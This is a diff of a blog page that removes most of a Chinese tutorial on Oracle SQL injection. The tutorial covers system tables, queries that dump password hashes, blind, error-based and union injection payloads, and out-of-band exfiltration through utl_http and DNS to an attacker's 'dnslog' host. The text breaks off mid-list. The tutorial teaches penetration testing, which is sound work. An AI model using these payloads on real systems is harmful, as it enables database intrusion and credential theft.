@@ -169,7 +169,7 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2020-08-10 22:22:26" itemprop="dateCreated datePublished" datetime="2020-08-10T22:22:26+08:00">2020-08-10</time>
+              <time title="Created: 2020-08-10 22:25:37" itemprop="dateCreated datePublished" datetime="2020-08-10T22:25:37+08:00">2020-08-10</time>
             </span>
 
           
@@ -184,210 +184,14 @@
 
       
           <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><code>0x00</code> 前言</h3><p>​    最近在实习，渗透跟<code>CTF</code>真的差距很大，既然如此，我就去学一下在实战环境中比较常见的<code>Oracle</code>数据库注入吧。毕竟<code>sql</code>注入这个东西在<code>CTF</code>中已经被玩坏了。想在大型比赛中看到正常的<code>sql</code>注入简直就是天方夜谭。只能靠自己的学习以及实战环境的摸索了。</p>
-<h3 id="0x01-入门"><a href="#0x01-入门" class="headerlink" title="0x01 入门"></a><code>0x01</code> 入门</h3><h4 id="1-1安装"><a href="#1-1安装" class="headerlink" title="1.1安装"></a><code>1.1安装</code></h4><p>​    既然是入门的话，那么首先就是<a href="https://blog.csdn.net/godot06/article/details/105976048" target="_blank" rel="noopener"><code>Oracle</code>的安装教学</a>。</p>
-<h4 id="1-2基础语法"><a href="#1-2基础语法" class="headerlink" title="1.2基础语法"></a><code>1.2基础语法</code></h4><p>​    既然要了解<code>Oracle</code>，那么<code>Oracle</code>的基础语法一定要会，这里就默认有<code>mysql</code>基础了。讲一下和<code>mysql</code>不一样的地方。</p>
-<blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p> 然后就是<code>sql</code>语句的几个不同点。</p>
-<ul>
-<li><p><code>sql</code>语句中必须要加 select 指名表名。也可以使用<code>dual</code>表进行查询。</p>
-</li>
-<li><p><code>Oracle</code>中只有<code>null</code>这个概念，没有空字符串这个概念，空字符串就是<code>null</code>。</p>
-</li>
-<li><p><code>Oracle</code>和<code>sqlite</code>有点像，都是使用<code>||</code>当做字符串的连接符。所以在<code>sql</code>注入的时候自然也就有了<code>replace</code>注入。</p>
-</li>
-<li><p><code>Oracle</code>的单引号和<code>mysql</code>是一样的，不过双引号是用来消除系统关键字的。</p>
-</li>
-<li><p>我们曾经看到的<code>rownum</code>是真是存在的。并且<code>oracle</code>中没有<code>limit</code>只能用下面的方式代替：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from pyy where rownum&#x3D;1;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>单行注释采取和<code>sqlite</code>相同的<code>--</code>。而多行注释符采用<code>/**/</code>。</p>
-</li>
-</ul>
-<h4 id="1-3系统表"><a href="#1-3系统表" class="headerlink" title="1.3系统表"></a><code>1.3系统表</code></h4><p>​    <code>Oracle</code>的系统表:</p>
-<ul>
-<li>dba_tables : 系统里所有的表的信息，需要DBA权限才能查询</li>
-<li>all_tables : 当前用户有权限的表的信息</li>
-<li>user_tables: 当前用户名下的表的信息</li>
-<li>DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表</li>
-<li>ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表</li>
-<li>USER_ALL_TABLES：某一用户所拥有的对象和表</li>
-</ul>
-<p><code>user_tables</code> 的范围最小，<code>all_tables</code> 看到的东西稍多一些，而 <code>dba_tables</code> 的信息最全。范围是:</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dba_tables &gt;= all_tables &gt;= user_tables</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-4权限和用户"><a href="#1-4权限和用户" class="headerlink" title="1.4权限和用户"></a><code>1.4权限和用户</code></h4><ul>
-<li>DBA: 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。</li>
-<li>RESOURCE:拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。</li>
-<li>CONNECT:拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构</li>
-</ul>
-<p>一般oracle数据库安装成功后会创建几个默认用户<code>sys</code>、<code>system</code>、<code>public</code>等。</p>
-<p><a href="https://www.cnblogs.com/yw0219/p/5855210.html" target="_blank" rel="noopener">https://www.cnblogs.com/yw0219/p/5855210.html</a></p>
-<p>​    其实<code>oracle</code>的结构和实例也是一个重点，但是这里就不详细讲了。有兴趣的可以看看下面的参考。</p>
-<h4 id="1-5查询数据"><a href="#1-5查询数据" class="headerlink" title="1.5查询数据"></a><code>1.5查询数据</code></h4><ul>
-<li><p>获取数据库版本：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%&#39;;</span><br><span class="line">SELECT version FROM v$instance;</span><br><span class="line">具体注入的语句：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle?id&#x3D;99&#39; union select 1,&#39;a&#39;,(SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%25&#39;) from dual -- +</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获取操作系统版本：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT banner FROM v$version where banner like &#39;TNS%&#39;;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle?id&#x3D;99&#39; union select 1,&#39;a&#39;,(SELECT banner FROM v$version where banner like &#39;TNS%25&#39;) from dual -- +</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获取当前用户权限的所有数据库：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT owner, table_name FROM all_tables;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获取当前数据库：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT global_name FROM global_name;</span><br><span class="line">SELECT name FROM v$database;</span><br><span class="line">SELECT instance_name FROM v$instance;</span><br><span class="line">SELECT SYS.DATABASE_NAME FROM DUAL;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获取用户相关信息：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">SELECT user FROM dual;获取当前数据库用户</span><br><span class="line">SELECT username FROM all_users ORDER BY username;列出所有用户</span><br><span class="line">SELECT name FROM sys.user$; — priv;列出所有用户</span><br><span class="line"></span><br><span class="line">列出密码哈希:</span><br><span class="line">SELECT name, password, astatus FROM sys.user$ — priv; &lt;&#x3D; 10g(astatus能够在acct被锁定的状态下给你反馈)</span><br><span class="line">SELECT name,spare4 FROM sys.user$ — priv; 11g</span><br><span class="line"></span><br><span class="line">获取数据库所有用户:</span><br><span class="line">SELECT username FROM all_users ORDER BY username;</span><br><span class="line">SELECT name FROM sys.user$; -- priv;</span><br><span class="line"></span><br><span class="line">SELECT * FROM session_privs; 获取当前用户权限</span><br><span class="line"></span><br><span class="line">SELECT * FROM dba_sys_privs -- priv;  获取所有用户权限</span><br><span class="line"></span><br><span class="line">获取用户角色</span><br><span class="line">SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</span><br><span class="line">SELECT DISTINCT grantee FROM dba_sys_privs;</span><br><span class="line"></span><br><span class="line">获取所有数据库用户密码</span><br><span class="line">SELECT name, password, astatus FROM sys.user$; -- priv, &lt;&#x3D; 10g;</span><br><span class="line">SELECT name, spare4 FROM sys.user$; -- priv, &gt;&#x3D; 11g; </span><br><span class="line"></span><br><span class="line">列出DBA账户:</span><br><span class="line">SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION &#x3D; ‘YES’; — priv;</span><br><span class="line"></span><br><span class="line">获取主机名和IP</span><br><span class="line">SELECT UTL_INADDR.get_host_name FROM dual;</span><br><span class="line">SELECT host_name FROM v$instance;</span><br><span class="line">SELECT UTL_INADDR.get_host_address FROM dual;  查IP</span><br><span class="line">SELECT UTL_INADDR.get_host_name(‘127.0.0.1’) FROM dual;  查主机名称</span><br><span class="line"></span><br><span class="line">SELECT name FROM V$DATAFILE;  获取DB文件路径</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获取字段名和表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name FROM all_tables; 获取表名</span><br><span class="line">SELECT column_name FROM all_tab_columns; 获取字段名</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h4 id="1-6有可能用到的函数"><a href="#1-6有可能用到的函数" class="headerlink" title="1.6有可能用到的函数"></a><code>1.6有可能用到的函数</code></h4><ul>
-<li><p>Initcap  将首字母大写，其余字母全部小写。</p>
-</li>
-<li><p>Lower  将所有字母全部转为小写。</p>
-</li>
-<li><p>Upper  将所有字母全部转为大写。</p>
-</li>
-<li><p>Concat 链接多个字符串，效果等同于<code>||</code>。</p>
-<ul>
-<li><pre><code class="sql"><span class="keyword">SELECT</span> <span class="keyword">Concat</span> (<span class="string">'a'</span>, <span class="string">'b'</span>) <span class="keyword">FROM</span> dual 结果：ab
-
-<span class="keyword">Select</span> <span class="string">'a'</span> || <span class="string">'b'</span> <span class="keyword">from</span> dual 结果：ab
-&lt;!<span class="comment">--￼9--&gt;</span></code></pre>
-</li>
-</ul>
-</li>
-<li><p>trim  清除两边的空格</p>
-</li>
-</ul>
-<p><a href="https://www.cnblogs.com/Johnny_Z/archive/2010/10/31/1865673.html" target="_blank" rel="noopener">https://www.cnblogs.com/Johnny_Z/archive/2010/10/31/1865673.html</a></p>
-<h4 id="1-7经典注入语句"><a href="#1-7经典注入语句" class="headerlink" title="1.7经典注入语句"></a><code>1.7经典注入语句</code></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.查询所有数据库</span><br><span class="line"></span><br><span class="line">由于Oralce没有库名,只有表空间,所以Oracle没有提供数据库名称查询支持，只提供了表空间名称查询。</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> v$<span class="keyword">tablespace</span>;<span class="comment">--查询表空间(需要一定权限)</span></span><br><span class="line"></span><br><span class="line">2.查询当前数据库中所有表名</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> user_tables;</span><br><span class="line"></span><br><span class="line">3.查询指定表中的所有字段名</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name = <span class="string">'table_name'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4.查询指定表中的所有字段名和字段类型</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name, data_type <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name = <span class="string">'table_name'</span>;</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-8寻找注入点"><a href="#1-8寻找注入点" class="headerlink" title="1.8寻找注入点"></a><code>1.8寻找注入点</code></h4><p>​    注意：尽量不要使用类似<code>and 1=1</code>这样的语句来判断是否含有注入点。我们可以使用加减乘除的方式来哦安短是否存在注入。因为注入的本质就是你写进去的数据被成了代码执行。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过 &lt;&gt; 来判断</span></span><br><span class="line"></span><br><span class="line">?id=1'+and+1&lt;&gt;6--+ #返回为真 页面正常</span><br><span class="line">?id=1'+and+1&lt;&gt;1--+ #返回为假 页面异常</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过 加减法来判断</span></span><br><span class="line"></span><br><span class="line">?id=1 <span class="comment">#返回id,为1的内容</span></span><br><span class="line">?id=2-1  <span class="comment">#返回为1的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过数据库报错来判断</span></span><br><span class="line"></span><br><span class="line">?id=1 <span class="comment">#返回为正常</span></span><br><span class="line">?id=1/0 <span class="comment">#返回异常</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过注释符来判断(多行注释:/**/,单行注释:--)</span></span><br><span class="line"></span><br><span class="line">?id=1 <span class="comment">#返回为正常</span></span><br><span class="line">?id=1<span class="comment">/*loecho*/</span> <span class="comment">#也返回正常</span></span><br><span class="line"></span><br><span class="line">?id=1 <span class="comment">#返回为正常</span></span><br><span class="line">?id=1<span class="comment">--loecho #也返回正常</span></span><br></pre></td></tr></table></figure>
-
-<p>​    当然，上面的都是一些不带引号的注入点，如果带引号怎么办呢？</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过&lt;&gt;来判断</span></span><br><span class="line"></span><br><span class="line">?name=cioi'+and+1&lt;&gt;6--+ #返回正常</span><br><span class="line">?name=cioi'+and+1&lt;&gt;1--+ #返回异常</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用字符串拼接符’||’，通过判断拼接符是否执行，从而判断是否存在注入.或者也可直接使用</span></span><br><span class="line"></span><br><span class="line">?name=cx'||'lover <span class="comment">#返回正常</span></span><br><span class="line">?name=cx'||'haha <span class="comment">#返回异常</span></span><br></pre></td></tr></table></figure>
-
-<p>笔者注：经过了实战的<code>sql</code>注入挖掘漏洞之后，我发现一般在注入中最好不要含有<code>%20</code>这种东西，建议以后测试的时候都使用<code>+</code>代替。笔者注结束。</p>
-<h3 id="0x02-注入"><a href="#0x02-注入" class="headerlink" title="0x02 注入"></a><code>0x02</code> 注入</h3><p>​    基本类型的注入上面已经说过了。这里重点提一下盲注。</p>
-<h4 id="2-1布尔盲注"><a href="#2-1布尔盲注" class="headerlink" title="2.1布尔盲注"></a><code>2.1布尔盲注</code></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用字符串相关函数，对逐个字符进行比较猜解来获取数据</span><br><span class="line">http://127.0.0.1/oracle?id=99' and (<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">user</span>, <span class="number">1</span>, <span class="number">1</span>) <span class="keyword">from</span> dual)=<span class="string">'O'</span> <span class="comment">-- +</span></span><br><span class="line">或者利用<span class="keyword">decode</span>函数+除<span class="number">0</span>(关于<span class="keyword">decode</span>函数看上面基本函数)</span><br><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="keyword">oracle</span>?<span class="keyword">id</span>=<span class="number">99</span><span class="string">' and 1=(select decode(substr(user, 1, 1), '</span>O<span class="string">', (1/1),0) from dual) -- +</span></span><br><span class="line"><span class="string">或者利用instr函数来进行布尔盲注(从一个字符串中查找指定子串的位置，查询结果中的位置，未找到便返回0，可以通过对子串位置进行遍历和迭代，获取到数据)</span></span><br><span class="line"><span class="string">?username=user'</span><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">instr</span>((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="string">'ADMIN'</span>)) <span class="comment">--</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="2-2时间盲注"><a href="#2-2时间盲注" class="headerlink" title="2.2时间盲注"></a><code>2.2时间盲注</code></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用时间延迟函数配合<span class="keyword">replace</span>和<span class="keyword">substr</span>以及<span class="keyword">decode</span>来进行注入</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> dual <span class="keyword">where</span> DBMS_PIPE.RECEIVE_MESSAGE(<span class="string">'olo'</span>, <span class="keyword">REPLACE</span>((<span class="keyword">SELECT</span> <span class="keyword">substr</span>(<span class="keyword">user</span>, <span class="number">1</span>, <span class="number">1</span>) <span class="keyword">FROM</span> dual), <span class="string">'O'</span>, <span class="number">10</span>))=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">decode</span>(<span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>),<span class="string">'O'</span>,dbms_pipe.receive_message(<span class="string">'olo'</span>,<span class="number">10</span>),<span class="number">0</span>) <span class="keyword">from</span> dual;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> dual <span class="keyword">where</span> <span class="number">1</span>=<span class="number">0</span> <span class="keyword">or</span> DBMS_PIPE.RECEIVE_MESSAGE(<span class="string">'pyy'</span>, <span class="keyword">REPLACE</span>((<span class="keyword">SELECT</span> <span class="keyword">substr</span>(<span class="keyword">user</span>, <span class="number">1</span>, <span class="number">1</span>) <span class="keyword">FROM</span> dual), <span class="string">'P'</span>, <span class="number">1</span>))=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">也可以利用获取大量数据的语句</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> all_objects</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-3报错注入"><a href="#2-3报错注入" class="headerlink" title="2.3报错注入"></a><code>2.3报错注入</code></h4><ul>
-<li><strong>utl_inaddr.get_host_name</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在11g之前不需要任何权限，在11g之后当前的数据库用户必须有网络访问权限</span><br><span class="line">select utl_inaddr.get_host_name((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>ctxsys.drithsx.sn</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">处理文本的函数，传入参数错误的时会报错返回异常</span><br><span class="line">select ctxsys.drithsx.sn(1, (select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>CTXSYS.CTX_REPORT.TOKEN_TYPE</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用于处理文本，也会出现参数错误返回异常</span><br><span class="line">select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), &#39;123&#39;) from dual;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>XMLType</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XMLType是oracle系统定义的数据类型，系统预定义了内部函数去访问XML数据</span><br><span class="line">select XMLType(&#39;&lt;:&#39;||(select user from dual)||&#39;&gt;&#39;) from dual;</span><br><span class="line">PS：调用的时候必须以&lt;:开头和&gt;结尾，即 &#39;&lt;:&#39;||balabala||&#39;&gt;&#39; 或者 chr(60)||balabal||chr(62）;如果返回的数据种有空格的话，会自动截断，导致数据不完整，这种情况下需要先转为 hex，再导出(或者有replace函数替换成其他非空字符)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>dbms_xdb_version.checkin</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.checkin((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>dbms_xdb_version.makeversioned</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.makeversioned((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>dbms_xdb_version.uncheckout</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xdb_version.uncheckout((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>dbms_utility.sqlid_to_sqlhash</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>ordsys.ord_dicom.getmappingxpath</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;</span><br><span class="line"></span><br><span class="line">或者直接使用</span><br><span class="line"></span><br><span class="line"># 中间为查询内容</span><br><span class="line">ordsys.ord_dicom.getmappingxpath(user,user,user)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>UTL_INADDR.get_host_name</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select UTL_INADDR.get_host_name((select user from dual)) from dual;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>UTL_INADDR.get_host_address</strong></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select UTL_INADDR.get_host_name(&#39;~&#39;||(select user from dual)||&#39;~&#39;) from dual;</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-4联合注入"><a href="#2-4联合注入" class="headerlink" title="2.4联合注入"></a><code>2.4联合注入</code></h4><p>​    利用<code>union select</code>从而达成联合注入。</p>
-<p>Tips: 因为<code>Oracle</code>是强匹配的，所以在<code>Oracle</code>进行类似<code>Union</code>联合查询的时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置，最后查询返回指定的记录时，<code>oracle</code>没有<code>limit</code>函数，要通过<code>&#39;&gt;=0&lt;=1&#39;</code>这种形式来指定。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 列名 <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">rownum</span> r,列名 <span class="keyword">from</span> 表名) <span class="keyword">where</span> r&gt;<span class="number">0</span> <span class="keyword">and</span> r&lt;<span class="number">5</span></span><br></pre></td></tr></table></figure>
-
-<p>​    具体操作流程：</p>
-<p>先用<code>order by</code>来判断列数:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1'% order by 10 <span class="comment">--</span></span><br></pre></td></tr></table></figure>
-
-<p>判断列数后使用<code>null</code>来填补注入数据。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>
-
-<p>然后注出数据库的名称:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=99' union <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,(<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>),<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">from</span> dual  <span class="comment">--</span></span><br><span class="line">这里用<span class="keyword">rownum</span>来指定返回结果，如果要指定数据库数据库需要使用&lt;&gt;(<span class="keyword">rownum</span> = <span class="number">1</span> <span class="keyword">and</span> owner &lt;&gt; <span class="string">'MASTER'</span>)</span><br></pre></td></tr></table></figure>
-
-<p>然后注出列名:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=99' union <span class="keyword">select</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="keyword">rownum</span> = <span class="number">1</span>),<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">from</span> dual <span class="comment">--</span></span><br></pre></td></tr></table></figure>
-
-<p>最后根据获得列名来爆数据。</p>
-<h4 id="2-5OOB通道"><a href="#2-5OOB通道" class="headerlink" title="2.5OOB通道"></a><code>2.5OOB通道</code></h4><p>​    <code>OOB</code>带外通道，使用一些常规通道之外的替代信道请求服务器资源。一般我们可以使用<code>HTTP</code>或者<code>DNS</code>请求将信息外带。具体的操作过程有点像<code>XXE</code>中的<code>getflag</code>或者命令执行中使用<code>curl ip -d /flag</code>的执行结果。我们可以通过这种方式极大的加快盲注的速度。</p>
-<p>​    当然请求外带的前提条件当然是靶机可以访问外网啊。另一个条件就是我们的用户要有足够的请求外网的权限。下面列出几种可以实现<code>http</code>请求攻击的渠道。</p>
-<ul>
-<li><p><strong>utl_http.request</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#utl_http.request向外网主机发送http请求，需要出外网http</span></span><br><span class="line"><span class="keyword">select</span> utl_http.request(<span class="string">'dnslog'</span>||(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual;</span><br><span class="line"><span class="comment">#注意一下哦。这里的 || 是字符串连接符，别搞错了好吧。dnslog指的是你的地址。</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>utl_inaddr.get_host_address</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dns解析带外</span><br><span class="line">把查询结果拼接到域名下，并使用DNS记录解析日志，通过这种方式获取查询结果</span><br><span class="line"><span class="keyword">select</span> utl_inaddr.get_host_address((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)||<span class="string">'dnslog'</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>SYS.DBMS_LDAP.INIT</strong></p>
